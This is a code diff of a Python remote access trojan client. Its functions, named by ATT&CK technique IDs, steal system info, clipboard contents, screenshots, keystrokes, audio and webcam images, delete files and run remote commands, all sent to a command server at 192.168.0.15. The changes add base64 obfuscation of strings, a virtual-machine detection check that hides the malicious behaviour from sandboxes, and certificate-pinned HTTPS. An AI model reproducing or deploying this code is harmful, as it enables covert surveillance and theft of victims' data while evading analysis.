@@ -1,75 +1,67 @@
-import os, subprocess,requests, socket, io, pyaudio, wave
-from PIL import ImageGrab
-from pynput import keyboard
-from time import sleep
-from datetime import datetime
-from platform import uname
-import base64
-
 class Client:
     def __init__(self, os_platf:str):
         self.os_platf = os_platf.lower()
     def t_1082(self):
-        if self.os_platf=='windows':
-            return subprocess.run(['systeminfo'], capture_output=True).stdout.decode()
-        elif self.os_platf=='linux':
-            res = subprocess.run('uname -a'.split(), capture_output=True).stdout.decode()
-            res += subprocess.run('ip addr'.split(), capture_output=True).stdout.decode()
-            res += subprocess.run(['lsblk'], capture_output=True).stdout.decode()
-            res += subprocess.run(['lsusb'], capture_output=True).stdout.decode()
+        if self.os_platf==base64.b64decode('d2luZG93cw==').decode():
+            return subprocess.run([base64.b64decode('c3lzdGVtaW5mbw==').decode()], capture_output=True).stdout.decode()
+        elif self.os_platf==base64.b64decode('bGludXg=').decode():
+            res = subprocess.run(base64.b64decode('dW5hbWUgLWE=').decode().split(), capture_output=True).stdout.decode()
+            res += subprocess.run(base64.b64decode('aXAgYWRkcg==').decode().split(), capture_output=True).stdout.decode()
+            res += subprocess.run([base64.b64decode('bHNibGs=').decode()], capture_output=True).stdout.decode()
+            res += subprocess.run([base64.b64decode('bHN1c2I=').decode()], capture_output=True).stdout.decode()
             return res
         
     def t_1059(self, command:str):
         return subprocess.run(command.split(),capture_output=True).stdout.decode()
 
     def t_1083(self, filename):
-        if self.os_platf=='windows':
-            disks = subprocess.run(["wmic","logicaldisk","get","caption"])
+        if self.os_platf==base64.b64decode('d2luZG93cw==').decode():
+            disks = subprocess.run([base64.b64decode('d21pYyBsb2dpY2FsZGlzayBnZXQgY2FwdGlvbg==').decode().split()])
             if not disks:
                 return -1
-            for v in str(disks, "utf-8").split()[1:]:    
+            for v in str(disks, base64.b64decode('dXRmLTg=')).split()[1:]:    
                 for dirpath, path, files in os.walk(v+'\\'):
                     if not files:
                         continue
                     for one_file in files:
                         if one_file==filename:
-                            return f'File - {dirpath+one_file}'
+                            return f'{base64.b64decode('RmlsZSAt').decode()} {dirpath+one_file}'
                         elif path==filename:
-                            return f'Directory - {dirpath+path}'
-        elif self.os_platf=='linux':  
+                            return f'{base64.b64decode('RGlyZWN0b3J5IC0=').decode()} {dirpath+path}'
+        elif self.os_platf==base64.b64decode('bGludXg=').decode():  
             for dirpath, path, files in os.walk('/'):
                 if not files:
                     continue
                 for one_file in files:
                     if one_file==filename:
-                        return f'File - {dirpath+one_file}'
+                        return f'{base64.b64decode('RmlsZSAt').decode()} {dirpath+one_file}'
                     elif path==filename:
-                        return f'Directory - {dirpath+path}'
-        return "Not Found"
+                        return f'{base64.b64decode('RGlyZWN0b3J5IC0=').decode()} {dirpath+path}'
+        return base64.b64decode('Tm90IEZvdW5k').decode()
         
     def t_1107(self, filepath):
         try:
             os.remove(filepath)
-            return 'ok'
+            return base64.b64decode('b2s=').decode()
         except:
-            return 'not ok'
+            return base64.b64decode('bm90IG9r').decode()
     
     def t_1057(self):
-        if self.os_platf=='windows':
-            return subprocess.run(['tasklist'],capture_output=True).stdout.decode()
-        elif self.os_platf=='linux':
-            return subprocess.run(['ps','aux'],capture_output=True).stdout.decode()
+        if self.os_platf==base64.b64decode('d2luZG93cw==').decode():
+            return subprocess.run([base64.b64decode('dGFza2xpc3Q=').decode()],capture_output=True).stdout.decode()
+        elif self.os_platf==base64.b64decode('bGludXg=').decode():
+            return subprocess.run([base64.b64decode('cHM=').decode(),base64.b64decode('YXV4').decode()],capture_output=True).stdout.decode()
 
     def t_1115(self):
-        if self.os_platf=='windows':
-            return subprocess.run(['powershell.exe','-c','Get-Clipboard'], capture_output=True).stdout.decode()
-        elif self.os_platf=='linux':
-            return subprocess.run(['xclip','-out'], capture_output=True).stdout.decode()
+        if self.os_platf==base64.b64decode('d2luZG93cw==').decode():
+            return subprocess.run([base64.b64decode('cG93ZXJzaGVsbC5leGU=').decode(),base64.b64decode('LWM=').decode(),base64.b64decode('R2V0LUNsaXBib2FyZA==').decode()], capture_output=True).stdout.decode()
+        elif self.os_platf==base64.b64decode('bGludXg=').decode():
+            return subprocess.run([base64.b64decode('eGNsaXA=').decode(),base64.b64decode('LW91dA==').decode()], capture_output=True).stdout.decode()
         
     def t_1113(self):
         screenshot = ImageGrab.grab()
         img_byte_arr = io.BytesIO()
-        screenshot.save(img_byte_arr, format='PNG')
+        screenshot.save(img_byte_arr, format=base64.b64decode('UE5H').decode())
         return base64.b64encode(img_byte_arr.getvalue())
 
     def t_1056(self, t):
@@ -96,7 +88,7 @@ class Client:
         RATE = 44100
         RECORD_SECONDS = t
         data = io.BytesIO()
-        with wave.open(data, 'wb') as wf:
+        with wave.open(data, base64.b64decode('d2I=').decode()) as wf:
             p = pyaudio.PyAudio()
             wf.setnchannels(CHANNELS)
             wf.setsampwidth(p.get_sample_size(FORMAT))
@@ -109,83 +101,114 @@ class Client:
         return base64.b64encode(data.getvalue())
     
     def t_1125(self):
-        if self.os_platf=='windows':
-            command = 'cmd.exe /c winget install 9wzdncrfjbbg --accept-source-agreements --accept-package-agreements'
+        if self.os_platf==base64.b64decode('d2luZG93cw==').decode():
+            command = base64.b64decode('Y21kLmV4ZSAvYyB3aW5nZXQgaW5zdGFsbCA5d3pkbmNyZmpiYmcgLS1hY2NlcHQtc291cmNlLWFncmVlbWVudHMgLS1hY2NlcHQtcGFja2FnZS1hZ3JlZW1lbnRz').decode()
             subprocess.run(command.split())
-            subprocess.run('cmd.exe /c start microsoft.windows.camera:'.split())
+            subprocess.run(base64.b64decode('Y21kLmV4ZSAvYyBzdGFydCBtaWNyb3NvZnQud2luZG93cy5jYW1lcmE6').decode().split())
             sleep(5)
             screen = self.t_1113()
-            subprocess.run('powershell.exe -c Stop-Process -Name "WindowsCamera" -Force'.split())
+            subprocess.run(base64.b64decode('cG93ZXJzaGVsbC5leGUgLWMgU3RvcC1Qcm9jZXNzIC1OYW1lICJXaW5kb3dzQ2FtZXJhIiAtRm9yY2U=').decode().split())
             return screen
         
-        elif self.os_platf=='linux':
-            return 'NOT IMPLEMENTED!'
+        elif self.os_platf==base64.b64decode('bGludXg=').decode():
+            return base64.b64decode('Tk9UIElNUExFTUVOVEVEIQ==').decode()
     
     def t_1105(self, data):
-        with open(f'{datetime.now().timestamp()}', 'wb') as fl:
+        with open(f'{datetime.now().timestamp()}', base64.b64decode('d2I=').decode()) as fl:
             fl.write(data)
         return ''
 
-def main(ip):
+def main(ip,cert):
     client = Client(uname().system)
     while True:
         while True:
             try:
-                requests.post('http://192.168.0.15:5000/is_ok', data={"ip":ip})
+                requests.post('https://192.168.0.15/is_ok', data={"ip":ip}, verify=cert)
                 break
             except:
-                print("Not connection!")
                 sleep(5)
 
         while True:
             res = ''
-            req_control_data = requests.get(f'http://192.168.0.15:5000/get_tactic/{ip}')
-            if req_control_data.status_code==404:
-                print("Not command!")
+            try:
+                req_control_data = requests.get(f'https://192.168.0.15/get_tactic/{ip}', verify=cert)
+                if req_control_data.status_code==404:
+                    sleep(5)
+                else:
+                    break
+            except:
                 sleep(5)
-            else:
-                break
         req_control_data = req_control_data.json()
-        if req_control_data['tactic'] == 'T1082':
+        if req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDEwODI=').decode():
             res = client.t_1082()
-        elif req_control_data['tactic'] == 'T1059':
+        elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDEwNTk=').decode():
             res = client.t_1059(req_control_data['add_data'])
-        elif req_control_data['tactic'] == 'T1083':
+        elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDEwODM=').decode():
             res = client.t_1083()
-        elif req_control_data['tactic'] == 'T1105':
+        elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDExMDU=').decode():
         
-            data = requests.get(f'http://192.168.0.15:5000/get_files?file={req_control_data['add_data']}')
+            data = requests.get(f'https://192.168.0.15/get_files?file={req_control_data['add_data']}', verify=cert)
             if data.status_code==200:
                 res = client.t_1105()
             else:
                 res = 'no data'
         
-        elif req_control_data['tactic'] == 'T1057':
+        elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDEwNTc=').decode():
             res = client.t_1057()
 
-        elif req_control_data['tactic'] == 'T1115':
+        elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDExMTU=').decode():
             res = client.t_1115()
 
-        elif req_control_data['tactic'] == 'T1113':
+        elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDExMTM=').decode():
             res = client.t_1113()
 
-        elif req_control_data['tactic'] == 'T1056':
+        elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDEwNTY=').decode():
             res = client.t_1056(req_control_data['add_data']) 
 
-        elif req_control_data['tactic'] == 'T1107':
+        elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDExMDc=').decode():
             res = client.t_1107(req_control_data['add_data']) 
 
-        elif req_control_data['tactic'] == 'T1123':
+        elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDExMjM=').decode():
             res = client.t_1123(req_control_data['add_data']) 
 
-        elif req_control_data['tactic'] == 'T1125':
+        elif req_control_data[base64.b64decode('dGFjdGlj').decode()] == base64.b64decode('VDExMjU=').decode():
             res = client.t_1125()
 
-        requests.post('http://192.168.0.15:5000/results.html', data={"ip":ip, "tactic":req_control_data['tactic'], "data":res})
+        requests.post('https://192.168.0.15/results.html', data={"ip":ip, f"{base64.b64decode('dGFjdGlj').decode()}":req_control_data[base64.b64decode('dGFjdGlj').decode()], "data":res}, verify=cert)
 
 
 if __name__=="__main__":
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.connect(('8.8.8.8',80))
-    ip = sock.getsockname()[0]
-    main(ip)
+    #Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\PCI\VEN_15AD&DEV_0790&SUBSYS_079015AD&REV_02
+    #                                                              VEN_XXXX&DEV_YYYY&SUBSYS_ZZZZ&REV_WW
+    from winreg import CreateKeyEx,EnumKey, HKEY_LOCAL_MACHINE,KEY_READ
+    handle = CreateKeyEx(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Enum\\PCI\\', access=KEY_READ)
+    is_vm = False
+    i = 0
+    while True:
+        try:
+            if 'VEN_80EE' in EnumKey(handle,i) or 'VEN_15AD' in EnumKey(handle,i):
+                is_vm = True
+                break
+            i+=1
+        except:
+            break
+    if not is_vm:
+        import os, subprocess,requests, socket, io, pyaudio, wave
+        from PIL import ImageGrab
+        from pynput import keyboard
+        from time import sleep
+        from datetime import datetime
+        from platform import uname
+        import base64
+        if uname().system.lower()==base64.b64decode('d2luZG93cw==').decode():
+            tmp = f"{os.getenv('TEMP')}\\cert.pem"
+        else:
+            tmp = '/tmp/cert.pem'
+        with open(tmp,'w') as fl:
+            fl.write(base64.b64decode('LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tDQpNSUlGSURDQ0F3aWdBd0lCQWdJVURtbU1wTjdCNXpOQUtDeXhWOEtvM2JjYndKWXdEUVlKS29aSWh2Y05BUUVMDQpCUUF3RnpFVk1CTUdBMVVFQXd3TU1Ua3lMakUyT0M0d0xqRTFNQjRYRFRJMU1UQXhNVEU1TlRJeE5sb1hEVEkyDQpNVEF4TVRFNU5USXhObG93RnpFVk1CTUdBMVVFQXd3TU1Ua3lMakUyT0M0d0xqRTFNSUlDSWpBTkJna3Foa2lHDQo5dzBCQVFFRkFBT0NBZzhBTUlJQ0NnS0NBZ0VBdm0xNTdUcVVqV01JRFlDaVQxdmsrSUEydEg4UlREb05XZnFHDQpMWEZ0Mlc1UEJJUXhxVTZuemgyRGtDVGt0K2JaRjgwRjdiRkFHVEZmeHpHQjZWVWdaeHVZYjh2Q1dNeExITG9TDQpKK2NqTGkvVy9VT09TSzZFZ2NEQ0VmNDdycXRJdXdEakZqa0RsYjRyWnJQKzZKeWlGdE5YSjg3azRJVUhYaU5ODQpEVkVwbVZ4NWhPc0p6ZEh6R1JpWDF3L0FDT0dVWXQwTm5GZndZcTFQWW1aWVQwTTFqaExjcFBJOUl4THpOSjVHDQorenIwNldnaHQ0d1BMeWhOZk81ZDYyWGxZcFZQam5GVHdnQjU2alNMSUxqTUxyN1k5VVNmUTVJUEViZEd6U05hDQo5eVFNSWdETXpPNldwVEtsT3I5T2xMMzlRSCtaWUxYMlVJUUZDRmpQOGI2R1kvc1k0UCtHK2VxMkJqMk1Nc1BjDQpCK1BxbmpqamZSdkZ5UzRsZHZmK3ZFb0dKU0FzS2NjaUpZaElvc1JFL0Njc3VMVVFiRngyczRhWkRFTXplMllmDQpBWk0wTEhqbzJhY1ZMMUxqZzlUSVhOTzJqVDkrd2FCbGZ2MXZ2RXhSRmhXN2RmYkgwN1hMdU9lRDAwNHJuZG1GDQoxY25wTFRHZ1FER3RlR0RSaHgwR1MxK3ozejJOVmF0U295ZmlPUG51Ym81MVNxNzgvNE85SExzekVnbXlaV2ZVDQo3OG9ZMjM0UjhSOWpiZFYrNGZ6Uy91bjBzRXAwUUNac3RFY2FqNWRpMmhTeXN0Tm5IZGt5UWFGcWw3bTdNK3ZjDQpka2YycEtmL1g5TGNJNm5PR3oxcDNKZTljZGRJemloOEFtanVFek1ONnZoa0tZNFhPNlFWQ0hDaU4yY2cybG52DQpTN1dqKzlzQ0F3RUFBYU5rTUdJd0hRWURWUjBPQkJZRUZQemtlQzkzQUFDVXVRYUV1UEh6S1llUFUxSUpNQjhHDQpBMVVkSXdRWU1CYUFGUHprZUM5M0FBQ1V1UWFFdVBIektZZVBVMUlKTUE4R0ExVWRFd0VCL3dRRk1BTUJBZjh3DQpEd1lEVlIwUkJBZ3dCb2NFd0tnQUR6QU5CZ2txaGtpRzl3MEJBUXNGQUFPQ0FnRUFpRWc0TVJJZ2g3cWZDV05sDQpwb2RhdUxqclh0bi9XYkk0Zk9VV25CZjI2NEdxeHFhc1Z5R3B1d3BYU2pEeHlKTzF0M3krM09EMGo3TzFSY2MvDQptTUJCclNqNWxpS1hCWmNJaFFEOUNtQ04yNS8yUWVsMVlKdGhYdWFCMUJRbTFHRDIwSVRCOGQwYjdaYVMwbmRjDQppVkhuYkxQSXdZSHB0dlpJdU4yOVNzUmNMSHlxeDAzWkpQV25kWFVZaE53eUgwSU9KVlFZTllydUc5R3ZxVFN2DQoyUWxkT0dRRm5VTkFmeE1KU0ZTeEJoNkJhMS9HNXpRU0x1Q2tSWExKRVcyQUkzNlhXdUV4aWxpWEhPNzNuekdSDQo1N1lNcWhpRXpLb2poQ3Nid3Y1SnN3RG8wSWhIWEtnR2xRaEJ6TzJZMmV6OFZjd2FqZDJVaUc2ZFB2V28vc0FwDQpJbGhEbmFJWjFqZHBSRStsUTEvNTJoR0hlNEhZaUN6VFRicFVwOHpOTC9wbk16d3dIcENRc09EaWEyd0h0emhqDQpxN1FUQ0JacFI2OEZuclV3eCtRaFU1OWp0Wm5xSHdlWDNJRm50ZFcwbFZNZmZkSmtYalFma2huYXVDVGx4T3cxDQpDbVRENlREQ0NqVHpRZlVTRmEyaDFQYnhyL1RmQlJkYVcyUmRDVVFaemZWd0lmVXBBZ2dzZ0dQL0ptbHg3RUFXDQpBTzFVTFFJVm4zNHlWODVOUG9iVm5MMDhUTmNTRDNNTE1WbXNuYlhreStSeW04VDFtajN2Y3dPVmdzMnBneXZtDQpWK1NwNE9RMlJuSmkxYk15TGVRbHRVNk81ZWdtUjFtZXNTUEE5djFFUzhQQjhzcjhlaFJRbU1NZXlRSFBNcjM5DQpzQk96b1JxOGNINGR6UDBpZUpLdnEwTVMxV1U9DQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0t').decode())
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.connect(('8.8.8.8',80))
+        ip = sock.getsockname()[0]
+        main(ip, tmp)
+    else:
+        print("Just CLI program!")
